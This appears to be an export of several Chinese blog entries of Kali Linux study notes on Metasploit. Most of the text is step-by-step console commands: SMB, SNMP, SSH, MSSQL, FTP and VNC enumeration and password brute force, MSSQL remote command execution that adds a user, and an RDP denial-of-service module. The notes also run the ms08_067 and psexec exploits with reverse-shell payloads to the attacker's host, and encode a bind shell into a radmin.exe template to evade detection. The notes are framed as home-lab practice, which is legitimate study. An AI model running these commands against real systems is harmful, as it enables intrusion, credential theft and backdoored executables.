<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ip/ipidseq</code></strong><ul>
<li><strong><code>🔺命令：set INTERFACE eth0</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.0/24</code></strong></li>
<li><strong><code>🔺命令：set PORTS 80</code></strong></li>
<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：nmap -Pn -sI 1.1.1.2 1.1.1.3</code></strong> </li>
</ul>
<h4 id="4-密码嗅探（Metasploit）"><a href="#4-密码嗅探（Metasploit）" class="headerlink" title="4. 密码嗅探（Metasploit）"></a>4. 密码嗅探（Metasploit）</h4><ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/sniffer/psnufle</code></strong><ul>
<li>不选pacap抓包文件格式</li>
<li>ftp登陆Metasploit，输入账号和密码，看是否能密码能被嗅探</li>
</ul>
</li>
<li>▲ 支持从pcap抓包文件中提取密码</li>
<li>功能类似于dsniff</li>
<li>目前只支持pop3、imap、ftp、HTTP GET协议</li>
</ul>
<h4 id="5-SNMP扫描（Metasploit和Window-Server-2003）"><a href="#5-SNMP扫描（Metasploit和Window-Server-2003）" class="headerlink" title="5. SNMP扫描（Metasploit和Window Server 2003）"></a>5. SNMP扫描（Metasploit和Window Server 2003）</h4><ul>
<li><strong><code>🔺命令：vi /etc/default/snmpd</code></strong> #Metasploit侦听地址修改为0.0.0.0<ul>
<li><strong><code>🔺命令：./etc/init.d/snmpd stop</code></strong></li>
<li><strong><code>🔺命令：./etc/init.d/snmpd start</code></strong></li>
</ul>
</li>
<li>▲ 2020.2.27 Metasploit中无SNMP服务</li>
<li>SNMP登陆<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_login</code></strong>（Linux）<ul>
<li>使用默认爆破文件</li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SNMP枚举<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enum</code></strong>（Linux）<ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SNMP用户枚举<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enumusers</code></strong>（windows）<ul>
<li><strong><code>🔺命令：set RHOST Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SNMP共享枚举<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enumshares</code></strong>（windows）<ul>
<li><strong><code>🔺命令：set RHOST Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：show advanced/options</code></strong><ul>
<li><strong><code>🔺命令：set VERBOSE true</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 无法显示隐藏的共享</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="6-SMB扫描（Metasploit和Window-Server-2003）"><a href="#6-SMB扫描（Metasploit和Window-Server-2003）" class="headerlink" title="6. SMB扫描（Metasploit和Window Server 2003）"></a>6. SMB扫描（Metasploit和Window Server 2003）</h4><ul>
<li>SMB版本扫描<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_version</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit和Window Server</code></strong>2003的IP（▲中间需空格）</li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPass/SMBUser</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>扫描命名管道，判断SMB服务类型（账号，密码）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/pipe_auditor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>扫描通过SMB管道可以访问的RCERPC服务<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/pipe_dcerpc_auditor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit和Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SMB共享枚举（账号，密码）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_enumshares</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SMB用户共享（账号，密码）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_enumusers</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SID枚举（账号，密码）<ul>
<li>▲ 主板创建账号时，以毫米级的时间为基准创建的唯一安全标识符，抽象于账号名称</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_lookupsid</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 系统自生成的账号，Administrator的RID为500，Guest的RID为501，自创建的新账号从1000开始，一般安全人员会对Administrator的名称进行修改成一个不其起眼的账号名称，另设一个权限非常小且密码复杂的名字为Administrator的非管理员权限账号</li>
</ul>
</li>
</ul>
<h4 id="7-SSH扫描（Metasploit）"><a href="#7-SSH扫描（Metasploit）" class="headerlink" title="7. SSH扫描（Metasploit）"></a>7. SSH扫描（Metasploit）</h4><ul>
<li>SSH版本扫描<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_version</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SSH密码爆破<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_login</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</code></strong>（可在字典中添加正确的密码）</li>
<li><strong><code>🔺命令：set VERBOSE false</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SSH公钥登陆<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_login_pubkey</code></strong><ul>
<li><strong><code>🔺命令：set KEY_FILE id_rsa</code></strong> </li>
<li><strong><code>🔺命令：set USERNAME root</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-SQL-Server扫描（安装有sql-server的Window-7）"><a href="#8-SQL-Server扫描（安装有sql-server的Window-7）" class="headerlink" title="8. SQL Server扫描（安装有sql server的Window 7）"></a>8. SQL Server扫描（安装有sql server的Window 7）</h4><ul>
<li>▲ 2020.2.28 Window 7无安装sql server</li>
<li>Mssql扫描端口<ul>
<li>▲ TCP/IP连接需要开启/sql server的网络服务需要开启</li>
<li>TCP 1433（动态端口）/ UDP 1434（查询TCP端口号，mssql）</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/mssql/mssql_ping</code></strong> <ul>
<li><strong><code>🔺命令：set RHOSTS Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong>（可查到随机动态高危端口）</li>
</ul>
</li>
</ul>
</li>
<li>爆破mssql密码<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/mssql/mssql_login</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：set username sa</code></strong></li>
<li><strong><code>🔺命令：set password /usr/share/password.txt</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>远程执行代码<ul>
<li>▲ 从端口扫描和密码爆破的端口和密码可用于远程代码执行</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/admin/mssql/mssql_exec</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：set PASSWORD</code></strong></li>
<li><strong><code>🔺命令：set RPORT</code></strong></li>
<li><strong><code>🔺命令：set CMD net user user pass /ADD</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="9-FTP扫描（Metasploit）"><a href="#9-FTP扫描（Metasploit）" class="headerlink" title="9. FTP扫描（Metasploit）"></a>9. FTP扫描（Metasploit）</h4><ul>
<li>FTP版本扫描<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/ftp_version</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/anonymous</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/ftp_login</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="10-系统补丁"><a href="#10-系统补丁" class="headerlink" title="10. 系统补丁"></a>10. 系统补丁</h4><ul>
<li>Windows缺少的补丁（Window XP SP3）</li>
<li>上微软的官网查看ms08-067对应的KB编号<ul>
<li>▲ 基于已经取得session进行检测</li>
<li>⭐ <strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
<li><strong><code>🔺命令：migrate 1060</code></strong>（其他模块）</li>
<li><strong><code>🔺命令：background</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use post/windows/gather/enum_patches</code></strong> <ul>
<li><strong><code>🔺命令：set session 1</code></strong></li>
<li><strong><code>🔺命令：set KB KB958644</code></strong></li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set VERBOSE yes</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 查看是否KB958644为missing</li>
<li>▲ 检查失败<ul>
<li>Known bug in WMI query, try migrating to another process</li>
<li>迁移到另一个进程再次尝试</li>
</ul>
</li>
<li>▲ 2020.2.28 此模块使用后返回数据过于奇怪</li>
</ul>
</li>
</ul>
<h4 id="11-应用弱点扫描（Metasploit、Window-XP-SP3和Window-7）"><a href="#11-应用弱点扫描（Metasploit、Window-XP-SP3和Window-7）" class="headerlink" title="11. 应用弱点扫描（Metasploit、Window XP SP3和Window 7）"></a>11. 应用弱点扫描（Metasploit、Window XP SP3和Window 7）</h4><ul>
<li>根据信息收集结果搜索漏洞利用模块</li>
<li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li>
<li>误判率、漏判率</li>
<li>VNC密码破解<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vnc/vnc_login</code></strong><ul>
<li><strong><code>🔺命令：set BLANK_PASSWORD yes</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：set THREADS 30</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>VNC无密码访问<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vnc/vnc_none_auth</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>supported：None, free access!</li>
</ul>
</li>
<li>RDP远程桌面漏洞<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/rdp/ms12_020_check</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Window XP SP和Window 7的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>检查不会造成DoS攻击</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>此模块会造成DoS攻击</li>
</ul>
</li>
<li>设备后门<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/juniper_backdoor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS juniper的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/fortinet_backdoor</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS fortinet的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 此两个设备无下载，此模块暂无实验</li>
</ul>
</li>
<li>VMWare ESXi 密码爆破<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vmware/vmauthd_login</code></strong><ul>
<li><strong><code>🔺命令：set BLANK_PASSWORD yes</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 网段</code></strong></li>
<li><strong><code>🔺命令：set PASSWORD 查询密码</code></strong></li>
<li><strong><code>🔺命令：set PASS_FILE 密码文件</code></strong></li>
<li><strong><code>🔺命令：set USERNAME 账号名称</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vmware/vmware_enum_vms</code></strong><ul>
<li><strong><code>🔺命令：set PASSWORD 已破解主机的密码</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 已破解主机的IP</code></strong></li>
<li><strong><code>🔺命令：set USERNAME 已破解主机的账号名称</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 暂无下载VMWare ESXI，此模块暂无实验</li>
</ul>
</li>
<li>利用WEB API远程开启虚拟机<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/admin/vmware/poweron_vm</code></strong><ul>
<li><strong><code>🔺命令：set PASSWORD 已破解主机的密码</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 已破解主机的IP</code></strong></li>
<li><strong><code>🔺命令：set USERNAME 已破解主机的账号名称</code></strong></li>
<li><strong><code>🔺命令：set VM 要开启的虚拟机</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 此模块需开启VMware Workstation Server，即监听443端口，但可能报错未能配置，此模块暂无实验</li>
</ul>
</li>
</ul>
<h4 id="12-HTTP弱点扫描（Metasploit）"><a href="#12-HTTP弱点扫描（Metasploit）" class="headerlink" title="12. HTTP弱点扫描（Metasploit）"></a>12. HTTP弱点扫描（Metasploit）</h4><ul>
<li>过期证书<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/cert</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 目标主机的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>显示目录及文件<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/dir_listing</code></strong>（目录遍历）<ul>
<li><strong><code>🔺命令：set PATH 设置要查询的目录</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/files_dir</code></strong>（爬网爆破模块）<ul>
<li><strong><code>🔺命令：set Dictionary /usr/share/metasploit-framework/data/wmap/wmap_files.txt</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>WebDAV Unicode编码身份验证绕过<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></strong><ul>
<li><strong><code>🔺命令：set Dictionary /usr/share/metasploit-framework/data/wmap/wmap_files.txt</code></strong></li>
<li><strong><code>🔺命令：set HTTP404S /usr/share/metasploit-framework/data/wmap/wmap_404s.txt</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Tomcat管理登陆页面<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/tomcat_mgr_login</code></strong><ul>
<li><strong><code>🔺命令：set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 暂无下载配置Tomcat登陆界面，此模块暂无实验</li>
</ul>
</li>
<li>基于HTTP方法的身份验证绕过<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/verb_auth_bypass</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Wordpress密码爆破<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/wordpress_login_enum</code></strong><ul>
<li><strong><code>🔺命令：set URI/wordpress/wp-login.php</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.02 暂无下载配置Wordpress登陆界面，此模块暂无实验</li>
</ul>
</li>
</ul>
<h4 id="13-WMAP-WEB应用扫描器"><a href="#13-WMAP-WEB应用扫描器" class="headerlink" title="13. WMAP WEB应用扫描器"></a>13. WMAP WEB应用扫描器</h4><ul>
<li>根据SQLMAP的工作方式开发</li>
<li><strong><code>🔺命令：load wmap</code></strong></li>
<li><strong><code>🔺命令：wmap_sites -a http://Metasploit的IP</code></strong><ul>
<li>-a：列出url的站点</li>
</ul>
</li>
<li><strong><code>🔺命令：wmap_targets -t http://Metasploit的IP/mutillidae/index.php</code></strong><ul>
<li>-t：指定具体扫描目标</li>
</ul>
</li>
<li><strong><code>🔺命令：wmap_run -t</code></strong><ul>
<li>-t：显示具体模块被使用</li>
<li>-e：执行，具体执行的模块 </li>
</ul>
</li>
<li><strong><code>🔺命令：wmap_vulns -l</code></strong><ul>
<li>-l：查看已经发现的漏洞结果</li>
</ul>
</li>
<li><strong><code>🔺命令：vulns</code></strong></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零二)：MSF模块--Payload、Encoders</title>
    <url>/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/</url>
    <content><![CDATA[<hr>
<h4 id="1-payload模块和encoders模块"><a href="#1-payload模块和encoders模块" class="headerlink" title="1. payload模块和encoders模块"></a>1. payload模块和encoders模块</h4><ul>
<li><strong><code>🔺命令：use payload/windows/shell_bind_tcp</code></strong><ul>
<li>▲ 默认情况下Ruby语言的shellcode</li>
<li>RHOST：用于限制来源IP，非发送IP </li>
<li><strong><code>🔺命令：generate</code></strong>（坏字符）</li>
</ul>
</li>
<li>msf自动选择编码绕过坏字符<ul>
<li><strong><code>🔺命令：show encodes</code></strong>：查看可进行编码的模块</li>
<li><strong><code>🔺命令：generate -b &#39;\x00&#39;</code></strong> </li>
<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></strong> </li>
<li><strong><code>🔺命令：generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b \xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&#39;</code></strong>（过滤字符过多，可能没有编码方式）</li>
</ul>
</li>
<li>手动指定编码模块<ul>
<li>参数<ul>
<li>-t：输出格式（可以使用C/python/java，generate -t c/python/java，默认为Ruby）▲ 2020.2.26 无-t操作，输出格式为-f</li>
<li>-i：加密的轮数</li>
<li>-k：不产生新的进程</li>
<li>-x：使用的程序模板  </li>
<li>-f：输出文件（包括路径）▲ 2020.2.26 -f操作为-o，-f为输出格式</li>
<li>-n：NOP sled length（无操作的长度） ▲ 2020.2.26 -s操作修改为-n</li>
</ul>
</li>
<li><strong><code>🔺命令：generate -e x86/nonalpha</code></strong></li>
<li><strong><code>🔺命令：generate -b &#39;\x00&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe</code></strong></li>
<li>压缩1.exe为1.zip</li>
<li><strong><code>🔺命令：cp 1.exe /mnt/hgfs/share</code></strong></li>
<li>拷贝到win7的电脑端并解压</li>
<li>win7双击启动，<strong><code>🔺命令：netstat -nao | findstr &quot;4444&quot;</code></strong>（看是否开启端口）</li>
<li><strong><code>🔺命令：kali nc win7的IP 4444</code></strong></li>
</ul>
</li>
<li>▲ NOP：no-operation / Next Operation（无任何操作）<ul>
<li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li>
<li><strong><code>🔺命令：generate -n 14</code></strong></li>
<li>比较有无NOP sled的payload的size长度</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零一)：MSF模块--Exploit</title>
    <url>/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/</url>
    <content><![CDATA[<hr>
<h4 id="1-Exploit模块"><a href="#1-Exploit模块" class="headerlink" title="1. Exploit模块"></a>1. Exploit模块</h4><ul>
<li>Active exploit<ul>
<li>攻击者主动发payload给被攻击方</li>
<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST 192.168.1.100</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST 192.168.1.1</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：set SMBUSER user1</code></strong> </li>
<li><strong><code>🔺命令：set SMBPASS pass1</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Passive Exploits <ul>
<li>被攻击者主动访问攻击者，攻击者返回payload给被攻击者</li>
<li><strong><code>🔺命令：use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</code></strong> <ul>
<li><strong><code>🔺命令：set URIPATH /</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：et LHOST 192.168.1.1</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Active-exploit"><a href="#2-实验–Active-exploit" class="headerlink" title="2. 实验–Active exploit"></a>2. 实验–Active exploit</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window 7主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>关闭防火墙，查看ip地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li><strong><code>🔺命令：msfconsole</code></strong><ul>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST Window 7的IP</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：set SMBUSER Window 7的一个用户账号</code></strong> </li>
<li><strong><code>🔺命令：set SMBPASS Window 7的一个用户密码</code></strong> </li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
<li><strong><code>🔺命令：sessions -l</code></strong></li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：shell</code></strong></li>
<li><strong><code>🔺命令：ifconfig</code></strong></li>
<li><strong><code>🔺命令：shutdown -r</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.2.26 该模块在win7上无法exploit</li>
</ul>
<h4 id="3-实验–Passive-Exploits"><a href="#3-实验–Passive-Exploits" class="headerlink" title="3. 实验–Passive Exploits"></a>3. 实验–Passive Exploits</h4><ul>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window 7主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>打开防火墙，查看ip地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li>msfconsole 重复Active exploit，看是否能进行连接</li>
</ul>
</li>
<li>Window XP SP2主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>打开防火墙，查看ip地址</li>
</ul>
</li>
<li>Kali主机<ul>
<li><strong><code>🔺命令：msfconsole</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</code></strong><ul>
<li><strong><code>🔺命令：set SRVHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong> </li>
<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
</ul>
</li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP2主机<ul>
<li>浏览器访问<a href="http://Kali的IP/" target="_blank" rel="noopener">http://Kali的IP/</a></li>
</ul>
</li>
<li>Kali之际<ul>
<li>看是否返回有关session、shell`**</li>
<li><strong><code>🔺命令：sessions -l</code></strong></li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：shell</code></strong></li>
<li><strong><code>🔺命令：shutdown -r</code></strong></li>
</ul>
</li>
<li>2020.2.26 暂无下载Window XP SP2，但在Window XP SP3上无法exploit</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百)：Meterpreter Shell</title>
    <url>/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/</url>
    <content><![CDATA[<hr>
<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ul>
</li>
<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
<li>注入合法系统进程并建立stager</li>
<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
</ul>
</li>
<li>服务端使用C语言编写</li>
<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
</ul>
